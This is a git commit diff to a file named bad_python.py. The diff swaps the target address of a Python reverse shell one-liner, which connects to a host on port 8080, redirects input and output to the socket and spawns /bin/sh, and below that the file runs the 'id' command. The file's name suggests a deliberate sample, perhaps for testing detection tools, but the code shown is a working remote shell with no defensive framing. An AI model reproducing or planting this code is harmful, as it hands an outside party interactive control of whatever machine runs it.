8ee7d2b2314c07da2e700bd5c448d88fbb3a685a
Uzo Ogbonna <younguzii@yahoo.com>
2022-05-04 14:36:09 +0300

    Update bad_python.py

--- bad_python.py
+++ bad_python.py
@@ -3,7 +3,7 @@ import os
 
 
 
-import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.29.224.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.4",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
 
 
 stream = os.popen('id')
